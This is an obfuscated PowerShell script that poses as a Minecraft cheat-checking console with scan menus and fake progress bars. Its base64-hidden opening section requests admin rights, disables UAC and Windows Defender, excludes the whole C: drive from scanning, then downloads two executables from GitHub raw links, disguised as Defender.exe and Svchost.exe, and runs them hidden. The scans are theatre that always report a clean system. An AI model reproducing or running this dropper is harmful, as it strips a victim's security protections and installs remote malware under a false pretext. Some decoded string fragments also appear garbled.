if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRtaW5pc3RyYXRvcg=='))))) {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IFJlcXVlc3RpbmcgQWRtaW4gcHJpdmlsZWdlcy4uLg==')))
    $arguments = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSBg')))(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICsg'))) + $MyInvocation + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Lk15Q29tbWFuZC5QYXRoICsg'))))`"(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQogICAgU3RhcnQtUHJvY2VzcyBQb3dlclNoZWxsIC1WZXJiIFJ1bkFzIC1Bcmd1bWVudExpc3Qg'))) + $arguments + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQogICAgRXhpdA0KfQ0KDQoNCldyaXRlLUhvc3Qg'))))STARTED (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQoNCg=='))) + $uacPath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ID0g'))))HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RW5hYmxlTFVB'))) -Value 0 -Force
Set-ItemProperty -Path $uacPath -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4='))) -Value 0 -Force

Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXI='))) -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGlzYWJsZUFudGlTcHl3YXJl'))) -Value 1 -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24='))) -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZw=='))) -Value 1 -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcIiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCg0KV3JpdGUtSG9zdCA=')))HI I AM AI ASSISTANT FLUX AI"
$url1 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL3N5czFlL3dpbmxvZ28vcmF3L3JlZnMvaGVhZHMvbWFpbi9EZWZlbmRlci5leGU=')))
$url2 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RrZWt0a3RrZXRrL3h1eXh1eXh1eS9yZWZzL2hlYWRzL21haW4venhjenhjenhjLmV4ZQ==')))
$path1 = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlRFTVBcRGVmZW5kZXIuZXhl'))))
$path2 = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlRFTVBcU3Zob3N0LmV4ZQ=='))))
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue

Start-Process -FilePath $path1 -WindowStyle Hidden
Start-Process -FilePath $path2 -WindowStyle Hidden

Clear-Host
$Host.UI.RawUI.WindowTitle = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U0hFTExCQUcgQ09OU09MRSB2Mi4wIHwgTU9EVUxF')))


function Show-KRAKEH-Header {
    # Очищаем область заголовка
    $headerArt = @"
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.
               dP^      dNMMNN888UU[[[/;:--.
          .o@P^            ,MMMMMMN888UU[[/;::-.
       o@^            NNMMMNN888UU[[[/~.o@P^
            888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
 ^^
"@ -split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))
    
    $lineY = 0
    for ($i_90747 = 0; $i_90747 -lt $headerArt.Count; $i_90747++) {
    $line = $headerArt[$i_90747];
    Write-Host $line -ForegroundColor Red
        $lineY++
}
    
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09'))) -ForegroundColor Magenta
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgICAgICAgIFNIRUxMQkFHIENPTlNPTEUgLSBSRUxFQVNFIEVESVRJT04gICAgICAgICA='))) -ForegroundColor Yellow
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09'))) -ForegroundColor Magenta
    Write-Host ''
}
function Show-ProgressBar {
    param($Text, $DurationMs = 3000, $BarWidth = 40)
    
    Write-Host $Text -ForegroundColor Cyan
    for ($i = 0; $i -le 100; $i+=2) {
        $percent = $i
        $filled = [math]::Floor($BarWidth * $percent / 100)
        $empty = $BarWidth - $filled
        
        $bar = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ww=='))) + (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Iw=='))) * $filled) + (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LQ=='))) * $empty) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XQ==')))
        Write-Host -NoNewline (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YHI='))) + $bar + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))) + $percent + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JQ=='))))
        Start-Sleep -Milliseconds ($DurationMs / 50)
    }
    Write-Host ''
}

function Clear-MenuArea {
    $currentY = [Console]::CursorTop
    for ($i = 0; $i -lt 15; $i++) {
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IA=='))) * 80)
    }
    [Console]::SetCursorPosition(0, 12)
}

do {
    Clear-Host
    Show-KRAKEH-Header
    

    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WzFdIE1JTkVDUkFGVCBTQ0FO'))) -ForegroundColor Green
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WzJdIEJFVEEgU0NBTg=='))) -ForegroundColor Yellow
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WzNdIEZVTEwgQ0hFQ0tFUiBGT0xERVIgLm1pbmVjcmFmdA=='))) -ForegroundColor Cyan
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WzRdIEVYSVQ='))) -ForegroundColor DarkRed
    Write-Host ''
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09'))) -ForegroundColor DarkGray
    $choice = Read-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U0VMRUNUIE9QVElPTiAoMS00KQ==')))
    
    
    switch ($choice) {
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MQ=='))) {
            Clear-MenuArea
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5bTUlORUNSQUZUIFNDQU4gSU5JVElBVEVEXQ=='))) -ForegroundColor Green
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q0hFQ0tJTkcgRk9MREVS'))) -DurationMs 2000
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q0hFQ0sgREVMRVRFRCBGSUxF'))) -DurationMs 1500
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q0hFQ0tJTkcgSU5TVEFMTCBGSUxF'))) -DurationMs 2500
            Write-Host ''
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IFNDQU4gQ09NUExFVEUgLSBOTyBUSFJFQVRTIEZPVU5E'))) -ForegroundColor Red
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5QcmVzcyBhbnkga2V5IHRvIHJldHVybiB0byBtZW51Li4u')))
            [Console]::ReadKey($true) | Out-Null
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Mg=='))) {
            Clear-MenuArea
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5bQkVUQSBTQ0FOIElOSVRJQVRFRF0='))) -ForegroundColor Yellow
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QkVUQSBTQ0FOIElOSVRJQUxJWklORw=='))) -DurationMs 1800
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QU5BTFlaSU5HIEhFVVJJU1RJQ1M='))) -DurationMs 2200
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VkVSSUZZSU5HIFNJR05BVFVSRVM='))) -DurationMs 1500
            Write-Host ''
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IEJFVEEgU0NBTiBDT01QTEVURSAtIFNZU1RFTSBDTEVBTg=='))) -ForegroundColor Yellow
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5QcmVzcyBhbnkga2V5IHRvIHJldHVybiB0byBtZW51Li4u')))
            [Console]::ReadKey($true) | Out-Null
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Mw=='))) {
            Clear-MenuArea
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5bRlVMTCAuTUlORUNSQUZUIENIRUNLRVIgSU5JVElBVEVEXQ=='))) -ForegroundColor Cyan
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U0NBTk5JTkcgLk1JTkVDUkFGVCBGT0xERVI='))) -DurationMs 3000
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RU5VTUVSQVRJTkcgQ0FDSEUgRklMRVM='))) -DurationMs 2000
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VkVSSUZZSU5HIEFTU0VUUyBJTlRFR1JJVFk='))) -DurationMs 2500
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q0hFQ0tJTkcgTU9EIENPTkZJR1VSQVRJT05T'))) -DurationMs 2000
            Show-ProgressBar -Text ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RklOQUxJWklORyBSRVBPUlQ='))) -DurationMs 1500
            Write-Host ''
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IEZVTEwgQ0hFQ0tFUiBDT01QTEVURSAtIEFMTCBGSUxFUyBWRVJJRklFRA=='))) -ForegroundColor Cyan
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5QcmVzcyBhbnkga2V5IHRvIHJldHVybiB0byBtZW51Li4u')))
            [Console]::ReadKey($true) | Out-Null
        }
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('NA=='))) {
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5bS1JBXTogRVhJVElORyBTSEVMTEJBRyBDT05TT0xFLi4u'))) -ForegroundColor DarkRed
        }
        default {
            Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG5bS1JBXTogSU5WQUxJRCBJTlBVVCAtIFBMRUFTRSBTRUxFQ1QgMS00'))) -ForegroundColor DarkRed
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('NA=='))))


Write-Host ''
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09'))) -ForegroundColor Magenta


Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0YfQuNGC0Ysg0L3QtSA='))) -NoNewline -ForegroundColor Red
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0L3QsNC50LTQtdC90Ysg'))) -NoNewline -ForegroundColor Yellow
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0L/RgNC+0YHQvNC+0YLRgCA='))) -NoNewline -ForegroundColor Green
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0LfQsNC60L7QvdGH0LXQvSA='))) -NoNewline -ForegroundColor Blue
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0YHQv9Cw0YHQuNCx0L4g'))) -NoNewline -ForegroundColor Cyan
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0YfRgtC+IA=='))) -NoNewline -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0LLRiyA='))) -NoNewline -ForegroundColor White
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0YEg'))) -NoNewline -ForegroundColor DarkYellow
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('0L3QsNC80Lg='))) -ForegroundColor Red
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PDM='))) -ForegroundColor Magenta

Write-Host ''
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IExhdW5jaGluZw==')))
Start-Process ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y21kLmV4ZQ=='))) -ArgumentList ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('L2MgY3VybCBwYXJyb3QubGl2ZSAmJiBwYXVzZQ==')))


Remove-Item $path1 -Force -ErrorAction SilentlyContinue
Remove-Item $path2 -Force -ErrorAction SilentlyContinue

Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V0VMQ09NRQ=='))) -ForegroundColor DarkGreen
([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V0VMQ09NRSBUTyBDTEFIIEZMVVg=')))
